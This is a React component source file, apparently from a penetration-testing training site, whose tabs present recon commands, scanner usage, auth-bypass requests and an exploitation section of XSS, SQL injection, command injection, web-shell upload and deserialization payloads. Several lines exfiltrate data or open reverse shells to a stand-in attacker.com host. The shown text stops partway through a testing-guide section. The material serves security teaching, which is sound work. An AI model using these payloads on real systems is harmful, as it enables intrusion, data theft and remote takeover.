
import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { 
  Shield, 
  Code, 
  Database, 
  Lock, 
  Bug, 
  Zap, 
  FileSearch, 
  Terminal,
  Globe,
  Server,
  Cloud,
  Smartphone,
  Brain,
  Target,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Info
} from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const AdvancedContentSection: React.FC = () => {
  const [activeTab, setActiveTab] = useState('reconnaissance');

  const advancedTabs = [
    { id: 'reconnaissance', title: 'Advanced Reconnaissance', icon: <FileSearch className="h-4 w-4" /> },
    { id: 'vulnerability-assessment', title: 'Vulnerability Assessment', icon: <Bug className="h-4 w-4" /> },
    { id: 'manual-testing', title: 'Manual Testing', icon: <Target className="h-4 w-4" /> },
    { id: 'exploitation', title: 'Exploitation Techniques', icon: <Zap className="h-4 w-4" /> },
    { id: 'professional-testing', title: 'Professional Testing', icon: <Shield className="h-4 w-4" /> },
    { id: 'cloud-security', title: 'Cloud Security', icon: <Cloud className="h-4 w-4" /> },
    { id: 'mobile-iot', title: 'Mobile & IoT', icon: <Smartphone className="h-4 w-4" /> },
    { id: 'advanced-research', title: 'Advanced Research', icon: <Brain className="h-4 w-4" /> },
    { id: 'tools-resources', title: 'Tools & Resources', icon: <Terminal className="h-4 w-4" /> },
    { id: 'case-studies', title: 'Case Studies', icon: <FileSearch className="h-4 w-4" /> },
    { id: 'legal-compliance', title: 'Legal & Compliance', icon: <Lock className="h-4 w-4" /> },
    { id: 'devsecops', title: 'DevSecOps Integration', icon: <Code className="h-4 w-4" /> }
  ];

  return (
    <div className="space-y-8">
      <div className="text-center mb-8">
        <h2 className="text-3xl font-bold text-cybr-primary mb-4">
          Advanced Web Penetration Testing
        </h2>
        <p className="text-lg text-cybr-muted">
          Master-level techniques, methodologies, and cutting-edge security research for professional penetration testers
        </p>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-6 w-full bg-cybr-muted/30 p-1 h-auto">
          {advancedTabs.map(tab => (
            <TabsTrigger 
              key={tab.id}
              value={tab.id}
              className="flex items-center gap-2 text-xs py-2 px-3"
            >
              {tab.icon}
              <span className="hidden sm:inline text-center">{tab.title}</span>
            </TabsTrigger>
          ))}
        </TabsList>

        {/* Advanced Reconnaissance */}
        <TabsContent value="reconnaissance" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <FileSearch className="h-5 w-5" />
                OSINT (Open Source Intelligence) Gathering
              </CardTitle>
              <CardDescription>
                Comprehensive passive information gathering techniques for web application assessment
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Google Dorking - Advanced Operators</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="bash"
                    code={`# Administrative Interfaces
site:example.com inurl:admin
site:example.com inurl:administrator
site:example.com inurl:login
site:example.com inurl:wp-admin
site:example.com inurl:phpmyadmin
site:example.com inurl:cpanel

# Configuration Files
site:example.com filetype:xml | filetype:conf
site:example.com ext:cfg | ext:env | ext:ini
site:example.com inurl:web.config
site:example.com inurl:.htaccess

# Database Files
site:example.com filetype:sql | filetype:dbf
site:example.com ext:db | ext:sqlite
site:example.com inurl:backup
site:example.com inurl:dump

# Sensitive Information
site:example.com "password" | "passwd"
site:example.com "api_key" | "apikey"
site:example.com "secret_key"
site:example.com "private_key"`}
                    title="Google Dorking Examples"
                  />
                  <CodeExample
                    language="bash"
                    code={`# Error Messages
site:example.com "error" | "exception"
site:example.com "stack trace" | "debug"
site:example.com "database error"
site:example.com "php error" | "asp error"

# Version Information
site:example.com "powered by" | "built with"
site:example.com inurl:readme
site:example.com filetype:txt "version"

# Directory Listings
site:example.com intitle:"index of"
site:example.com intitle:"directory listing"
site:example.com "parent directory"

# Development Files
site:example.com inurl:dev | inurl:development
site:example.com inurl:test | inurl:testing
site:example.com inurl:stage | inurl:staging
site:example.com inurl:beta`}
                    title="Advanced Dork Queries"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Subdomain Enumeration Tools</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="bash"
                    code={`# Amass - Advanced DNS Enumeration
amass enum -d example.com
amass enum -brute -d example.com
amass enum -active -d example.com -p 80,443,8080

# Subfinder - High-speed Discovery
subfinder -d example.com
subfinder -d example.com -all
subfinder -d example.com -o subdomains.txt

# Assetfinder - Rapid Discovery
assetfinder example.com
assetfinder --subs-only example.com

# DNSRecon - Comprehensive DNS
dnsrecon -d example.com -t std
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt`}
                    title="Active Enumeration"
                  />
                  <CodeExample
                    language="bash"
                    code={`# Certificate Transparency Logs
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value'

# Passive DNS with SecurityTrails
curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains" \\
  -H "APIKEY: YOUR_API_KEY" | jq -r '.subdomains[]'

# Wayback Machine URLs
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey"

# GitHub Code Search
curl -s "https://api.github.com/search/code?q=example.com" | jq -r '.items[].html_url'`}
                    title="Passive Enumeration"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Technology Stack Detection</h4>
                <CodeExample
                  language="bash"
                  code={`# Wappalyzer CLI
wappalyzer https://example.com

# WhatWeb - Comprehensive Detection
whatweb https://example.com
whatweb -v https://example.com
whatweb --aggression=3 https://example.com

# BuiltWith API
curl "https://api.builtwith.com/v12/api.json?KEY=YOUR_KEY&LOOKUP=example.com"

# Retire.js - JavaScript Library Scanner
retire --js --outputformat json --outputpath results.json https://example.com

# Nuclei - Template-based Scanning
nuclei -u https://example.com -t technologies/
nuclei -u https://example.com -t exposures/`}
                  title="Technology Fingerprinting"
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Content Discovery Techniques</CardTitle>
              <CardDescription>Advanced directory and file enumeration methods</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CodeExample
                  language="bash"
                  code={`# Gobuster - High Performance
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt
gobuster vhost -u https://example.com -w /usr/share/wordlists/subdomains-top1million-5000.txt

# FFuF - Fast Web Fuzzer
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -fc 404
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -mc 200,301,302`}
                  title="Directory Enumeration"
                />
                <CodeExample
                  language="bash"
                  code={`# Parameter Discovery
ffuf -w /usr/share/wordlists/parameters.txt -u https://example.com/index.php?FUZZ=test -fc 404

# Backup File Discovery
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x bak,old,orig,backup,~

# API Endpoint Discovery
gobuster dir -u https://example.com -w /usr/share/wordlists/api-endpoints.txt -x json

# Git Repository Scanner
python3 gitdorker.py -tf tokens.txt -q example.com -d dorks/`}
                  title="Specialized Discovery"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Vulnerability Assessment */}
        <TabsContent value="vulnerability-assessment" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Bug className="h-5 w-5" />
                Advanced Vulnerability Scanning
              </CardTitle>
              <CardDescription>
                Professional-grade vulnerability assessment methodologies and tools
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Burp Suite Professional - Complete Configuration</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Scanner Configuration</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Passive scanning: Always enabled for background analysis</li>
                        <li>• Active scanning: Configure insertion points and attack types</li>
                        <li>• Scanner issues: Customize severity levels and false positive handling</li>
                        <li>• Live scanning: Real-time vulnerability detection during browsing</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Intruder Attack Types</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• <strong>Sniper:</strong> Single payload set, one position at a time</li>
                        <li>• <strong>Battering Ram:</strong> Single payload set, all positions simultaneously</li>
                        <li>• <strong>Pitchfork:</strong> Multiple payload sets, parallel iteration</li>
                        <li>• <strong>Cluster Bomb:</strong> Multiple payload sets, all combinations</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="bash"
                    code={`# Burp Suite Command Line
java -jar -Xmx4g burpsuite_pro.jar

# Headless Scanning
java -jar -Djava.awt.headless=true burpsuite_pro.jar \\
  --project-file=project.burp \\
  --config-file=config.json

# API Integration
curl -X POST http://localhost:1337/v0.1/scan \\
  -H "Content-Type: application/json" \\
  -d '{"urls":["https://example.com"]}'`}
                    title="Burp Suite Automation"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">OWASP ZAP Advanced Usage</h4>
                <CodeExample
                  language="bash"
                  code={`# ZAP Baseline Scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py \\
  -t https://example.com -g gen.conf -r testreport.html

# ZAP Full Scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py \\
  -t https://example.com -g gen.conf -r testreport.html

# ZAP API Scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-api-scan.py \\
  -t https://example.com/api/swagger.json -f openapi -g gen.conf -r testreport.html

# ZAP with Authentication
zap.sh -daemon -config api.key=your-api-key
curl "http://localhost:8080/JSON/authentication/action/setAuthenticationMethod/?contextId=0&authMethodName=formBasedAuthentication&authMethodConfigParams=loginUrl%3Dhttps%3A//example.com/login%26loginRequestData%3Dusername%3D%7B%25username%25%7D%26password%3D%7B%25password%25%7D"

# ZAP Scripting
curl "http://localhost:8080/JSON/script/action/load/?scriptName=MyScript&scriptType=standalone&scriptEngine=ECMAScript&fileName=/path/to/script.js"`}
                  title="ZAP Automation & API"
                />
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Nuclei - Template-based Scanning</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="bash"
                    code={`# Basic Nuclei Scans
nuclei -u https://example.com
nuclei -l urls.txt
nuclei -u https://example.com -t cves/
nuclei -u https://example.com -t exposures/
nuclei -u https://example.com -t vulnerabilities/

# Advanced Filtering
nuclei -u https://example.com -s critical,high
nuclei -u https://example.com -tags sqli,xss
nuclei -u https://example.com -author geeknik
nuclei -u https://example.com -severity critical

# Custom Templates
nuclei -u https://example.com -t custom-templates/
nuclei -u https://example.com -t ~/nuclei-templates/custom/`}
                    title="Nuclei Scanning"
                  />
                  <CodeExample
                    language="yaml"
                    code={`id: custom-api-key-exposure

info:
  name: API Key Exposure Detection
  author: security-team
  severity: high
  description: Detects exposed API keys in responses
  tags: exposure,api,keys

requests:
  - method: GET
    path:
      - "{{BaseURL}}/config.json"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/app.config"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "api[_-]?key['\"]?\\s*[:=]\\s*['\"]?[a-zA-Z0-9]{20,}"
          - "secret[_-]?key['\"]?\\s*[:=]\\s*['\"]?[a-zA-Z0-9]{20,}"
        condition: or

      - type: status
        status:
          - 200`}
                    title="Custom Template Example"
                  />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Advanced Fuzzing Techniques</CardTitle>
              <CardDescription>Parameter discovery and injection testing methodologies</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CodeExample
                  language="bash"
                  code={`# Parameter Discovery with Arjun
python3 arjun.py -u https://example.com/api/endpoint
python3 arjun.py -u https://example.com/search --get
python3 arjun.py -u https://example.com/login --post

# ParamMiner (Burp Extension)
# Discovers hidden parameters through:
# - Cache poisoning techniques
# - Response analysis
# - Header injection
# - Cookie manipulation

# Parameter Pollution Testing
ffuf -w parameters.txt -u "https://example.com/search?query=test&FUZZ=value"
ffuf -w parameters.txt -u "https://example.com/api?param1=value1&FUZZ=value2"`}
                  title="Parameter Discovery"
                />
                <CodeExample
                  language="bash"
                  code={`# Advanced Payload Testing
wfuzz -c -z file,payloads/xss.txt -u "https://example.com/search?q=FUZZ"
wfuzz -c -z file,payloads/sqli.txt -u "https://example.com/login" -d "username=admin&password=FUZZ"

# Custom Wordlist Generation
cewl https://example.com -w custom_wordlist.txt
cewl https://example.com -d 2 -m 5 -w custom_wordlist.txt

# Mutation-based Fuzzing
radamsa -o output_%n.txt -n 100 input.txt
zzuf -s 0:100 -c -C 0 -q < input.txt`}
                  title="Payload Generation"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Manual Testing Methodologies */}
        <TabsContent value="manual-testing" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Target className="h-5 w-5" />
                Session Management Testing
              </CardTitle>
              <CardDescription>
                Comprehensive session security assessment techniques
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Session Token Analysis</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Token Randomness Testing</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Collect 100+ session tokens from the application</li>
                        <li>• Analyze entropy using statistical tests (Chi-square, Kolmogorov-Smirnov)</li>
                        <li>• Check for patterns, sequential values, or predictable components</li>
                        <li>• Use Burp Sequencer for automated analysis</li>
                        <li>• Calculate bit entropy: H(X) = -Σ P(xi) * log2(P(xi))</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Session Lifecycle Testing</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Test session creation: How are tokens generated?</li>
                        <li>• Session renewal: Do tokens change during the session?</li>
                        <li>• Session expiration: Are timeouts properly enforced?</li>
                        <li>• Session termination: Is logout effective across all contexts?</li>
                        <li>• Concurrent sessions: Are multiple sessions allowed?</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="python"
                    code={`import requests
import statistics
import math
from collections import Counter

def analyze_session_entropy(tokens):
    """Analyze entropy of session tokens"""
    all_chars = ''.join(tokens)
    char_count = Counter(all_chars)
    total_chars = len(all_chars)
    
    # Calculate Shannon entropy
    entropy = 0
    for count in char_count.values():
        probability = count / total_chars
        entropy -= probability * math.log2(probability)
    
    return entropy

def test_session_randomness():
    """Collect and analyze session tokens"""
    tokens = []
    session = requests.Session()
    
    for i in range(100):
        # Login and get session token
        response = session.post('https://example.com/login', 
                              data={'username': 'test', 'password': 'test'})
        
        # Extract session token
        token = session.cookies.get('SESSIONID')
        if token:
            tokens.append(token)
        
        # Logout to get fresh token
        session.get('https://example.com/logout')
    
    # Analyze entropy
    entropy = analyze_session_entropy(tokens)
    print(f"Session token entropy: {entropy:.2f} bits")
    
    return tokens`}
                    title="Session Token Analysis Script"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Authentication Bypass Techniques</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="http"
                    code={`# SQL Injection in Authentication
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything

# NoSQL Injection
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}

# HTTP Parameter Pollution
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&username=guest&password=wrong&password=correct`}
                    title="Injection-based Bypass"
                  />
                  <CodeExample
                    language="http"
                    code={`# Race Condition Authentication
# Rapid parallel requests to exploit timing windows
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong

# Password Reset Token Manipulation
POST /reset-password HTTP/1.1
Host: example.com
Content-Type: application/json

{"token": "abc123", "new_password": "hacked", "user_id": "1"}

# Multi-Factor Authentication Bypass
POST /verify-2fa HTTP/1.1
Host: example.com
Content-Type: application/json

{"code": "000000", "backup_code": "reused_code"}`}
                    title="Logic-based Bypass"
                  />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Authorization Testing Framework</CardTitle>
              <CardDescription>Systematic approach to access control testing</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CodeExample
                  language="bash"
                  code={`# Vertical Privilege Escalation Testing
# Test as low-privilege user
curl -H "Authorization: Bearer user_token" \\
  https://example.com/admin/users

# Test direct object access
curl -H "Authorization: Bearer user_token" \\
  https://example.com/api/admin/delete-user/123

# Function-level access testing
curl -H "Authorization: Bearer user_token" \\
  -X DELETE https://example.com/api/users/456

# Hidden endpoint discovery
ffuf -w admin-endpoints.txt \\
  -u https://example.com/FUZZ \\
  -H "Authorization: Bearer user_token"`}
                  title="Privilege Escalation Tests"
                />
                <CodeExample
                  language="bash"
                  code={`# Horizontal Privilege Escalation
# Access other users' resources
curl -H "Authorization: Bearer userA_token" \\
  https://example.com/api/users/userB/profile

# IDOR Testing with Parameter Manipulation
curl -H "Authorization: Bearer user_token" \\
  "https://example.com/api/documents?user_id=OTHER_USER_ID"

# Path Traversal in Authorization
curl -H "Authorization: Bearer user_token" \\
  "https://example.com/api/files/../../../etc/passwd"

# Multi-tenant Boundary Testing
curl -H "Authorization: Bearer tenant1_token" \\
  -H "X-Tenant-ID: tenant2" \\
  https://example.com/api/data`}
                  title="Horizontal Escalation Tests"
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Business Logic Testing</CardTitle>
              <CardDescription>Workflow manipulation and logic flaw detection</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-2">Workflow Manipulation Techniques</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• <strong>Step Skipping:</strong> Skip validation or payment steps</li>
                      <li>• <strong>Process Reversal:</strong> Complete steps in wrong order</li>
                      <li>• <strong>Parallel Processing:</strong> Execute concurrent workflows</li>
                      <li>• <strong>State Corruption:</strong> Manipulate application state</li>
                      <li>• <strong>Time Manipulation:</strong> Exploit timing dependencies</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium mb-2">E-commerce Specific Tests</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• Price manipulation in shopping cart</li>
                      <li>• Negative quantity testing</li>
                      <li>• Discount code stacking and reuse</li>
                      <li>• Payment process interruption</li>
                      <li>• Inventory bypass techniques</li>
                    </ul>
                  </div>
                </div>
                <CodeExample
                  language="javascript"
                  code={`// Shopping Cart Manipulation
// 1. Add item to cart
fetch('/api/cart/add', {
  method: 'POST',
  body: JSON.stringify({
    product_id: 123,
    quantity: 1,
    price: 100.00
  })
});

// 2. Manipulate price before checkout
fetch('/api/cart/update', {
  method: 'PUT',
  body: JSON.stringify({
    item_id: 456,
    price: 0.01,  // Price manipulation
    quantity: 1
  })
});

// 3. Race condition during payment
Promise.all([
  fetch('/api/payment/process', {method: 'POST', body: paymentData}),
  fetch('/api/cart/clear', {method: 'DELETE'})
]);

// 4. Negative quantity testing
fetch('/api/cart/add', {
  method: 'POST',
  body: JSON.stringify({
    product_id: 123,
    quantity: -1,  // Negative quantity
    price: 100.00
  })
});`}
                  title="Business Logic Exploit Examples"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Exploitation Techniques */}
        <TabsContent value="exploitation" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Zap className="h-5 w-5" />
                Advanced Payload Crafting
              </CardTitle>
              <CardDescription>
                Master-level exploitation techniques and payload development
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">XSS Payload Engineering</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="javascript"
                    code={`<!-- Basic XSS Payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Filter Bypass Techniques -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
<script>alert\`XSS\`</script>
<script>alert('XS'+'S')</script>

<!-- Event Handler Exploitation -->
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<video onloadstart=alert('XSS')><source></video>`}
                    title="XSS Payload Examples"
                  />
                  <CodeExample
                    language="javascript"
                    code={`<!-- WAF Bypass Techniques -->
<script>/**/alert('XSS')</script>
<script>/*!alert('XSS')*/</script>
<script>alert('XSS')</script>
<SCRIPT>alert('XSS')</SCRIPT>
<script>\\u0061lert('XSS')</script>

<!-- CSP Bypass -->
<script nonce="random123">alert('XSS')</script>
<script src="data:text/javascript,alert('XSS')"></script>
<script src="//attacker.com/xss.js"></script>

<!-- Advanced Techniques -->
<script>
fetch('/api/sensitive')
  .then(r=>r.text())
  .then(d=>location='//attacker.com/?'+btoa(d))
</script>

<script>
navigator.sendBeacon('//attacker.com', 
  new FormData(document.forms[0]))
</script>`}
                    title="Advanced XSS Techniques"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">SQL Injection Mastery</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="sql"
                    code={`-- Union-based Injection
' UNION SELECT 1,2,3,4,5--
' UNION ALL SELECT NULL,NULL,NULL--
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT user(),database(),version()--

-- Boolean-based Blind Injection
' AND 1=1--
' AND 1=2--
' AND LENGTH(database())>5--
' AND SUBSTR(database(),1,1)='a'--
' AND ASCII(SUBSTR(database(),1,1))>97--

-- Time-based Blind Injection
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
'; SELECT pg_sleep(5)--

-- Error-based Injection
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--`}
                    title="SQL Injection Techniques"
                  />
                  <CodeExample
                    language="sql"
                    code={`-- Advanced WAF Bypass
/*!50000SELECT*/ * FROM users
/**/UNION/**/SELECT/**/
UNION%a0SELECT%a0
UniOn SeLeCt
%55%4e%49%4f%4e %53%45%4c%45%43%54

-- Second-order Injection
admin'-- (stored, executed later)
'; INSERT INTO users VALUES ('admin2','pass123')--

-- Database-specific Techniques
-- MySQL
' AND @@version LIKE '5%'--
'; SET @sql=CONCAT('SELECT * FROM ',database(),'.users'); 
  PREPARE stmt FROM @sql; EXECUTE stmt--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'nc attacker.com 4444 -e /bin/sh'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--`}
                    title="Advanced SQL Injection"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Command Injection Techniques</h4>
                <CodeExample
                  language="bash"
                  code={`# Basic Command Injection
; ls -la
| whoami
& id
&& cat /etc/passwd
|| uname -a
\`whoami\`
$(whoami)

# Advanced Bypass Techniques
; w'h'o'a'm'i
; who$IFS$()ami
; who\${IFS}ami
; wh''oami
; wh""oami
; echo "d2hvYW1p" | base64 -d | sh
; printf "\\x77\\x68\\x6f\\x61\\x6d\\x69" | sh

# Blind Command Injection
; sleep 5
; ping -c 4 attacker.com
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com

# Out-of-band Techniques
; curl http://attacker.com/$(cat /etc/passwd | base64)
; nc attacker.com 4444 -e /bin/sh
; bash -i >& /dev/tcp/attacker.com/4444 0>&1`}
                  title="Command Injection Payloads"
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>File Upload Exploitation</CardTitle>
              <CardDescription>Advanced file upload vulnerability exploitation techniques</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CodeExample
                  language="bash"
                  code={`# Extension Bypasses
.php
.php3, .php4, .php5
.phtml
.pht
.phps
.php.jpg
.jpg.php
.png.php

# Double Extension
file.jpg.php
file.png.php
file.gif.asp

# Null Byte Injection
file.php%00.jpg
file.asp%00.png

# Case Variation
file.PHP
file.Php
file.pHp

# Magic Bytes Manipulation
# Add GIF header to PHP file
GIF87a<?php system($_GET['cmd']); ?>

# Add JPEG header
ÿØÿà<?php system($_GET['cmd']); ?>`}
                  title="Upload Filter Bypass"
                />
                <CodeExample
                  language="bash"
                  code={`# Polyglot Files
# GIF + PHP
GIF87a
<?php system($_GET['cmd']); ?>

# Path Traversal in Filename
../../../shell.php
..\\\\..\\\\..\\\\shell.asp
....//....//shell.jsp

# Server-specific Bypasses
# Apache .htaccess
AddType application/x-httpd-php .jpg

# IIS web.config
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP via FastCGI" 
           path="*.jpg" 
           verb="*" 
           modules="FastCgiModule" 
           scriptProcessor="C:\\php\\php-cgi.exe" />
    </handlers>
  </system.webServer>
</configuration>`}
                  title="Advanced Upload Techniques"
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Deserialization Attacks</CardTitle>
              <CardDescription>Multi-language deserialization exploitation</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CodeExample
                  language="java"
                  code={`// Java Deserialization
// Commons Collections 3.1
java.util.PriorityQueue
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.functors.ChainedTransformer

// ysoserial payload generation
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64

// Spring Framework
org.springframework.beans.factory.ObjectFactory

// Fastjson
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://attacker.com:1389/Exploit",
 "autoCommit":true}`}
                  title="Java Deserialization"
                />
                <CodeExample
                  language="python"
                  code={`# Python Pickle Deserialization
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())

# PyYAML Deserialization
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Django Deserialization
django.core.signing.loads(payload, key='secret_key')

# PHP Unserialize
class Exploit {
    public $command = 'system';
    public $args = 'id';
    
    public function __destruct() {
        call_user_func($this->command, $this->args);
    }
}

// Payload: O:7:"Exploit":2:{s:7:"command";s:6:"system";s:4:"args";s:2:"id";}`}
                  title="Multi-language Deserialization"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Professional Testing Methodologies */}
        <TabsContent value="professional-testing" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Shield className="h-5 w-5" />
                OWASP Testing Guide Implementation
              </CardTitle>
              <CardDescription>
                Complete implementation of OWASP Testing Guide v4.2 methodology
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Information Gathering (WSTG-INFO)</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">WSTG-INFO-01: Search Engine Discovery</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Google dorking with 100+ operators</li>
                        <li>• Bing/Yahoo specific search techniques</li>
                        <li>• International search engines (Baidu, Yandex)</li>
                        <li>• Image and news search reconnaissance</li>
                        <li>• Social media platform discovery</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">WSTG-INFO-02: Web Server Fingerprinting</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• HTTP header analysis and manipulation</li>
                        <li>• Response timing and behavior analysis</li>
                        <li>• Error page fingerprinting</li>
                        <li>• HTTP method enumeration</li>
                        <li>• SSL/TLS configuration assessment</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="bash"
                    code={`# WSTG-INFO-01: Search Engine Discovery
# Google Dorking Examples
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com ext:sql | ext:db
site:example.com "index of"
site:example.com "password" | "passwd"

# WSTG-INFO-02: Web Server Fingerprinting
curl -I https://example.com
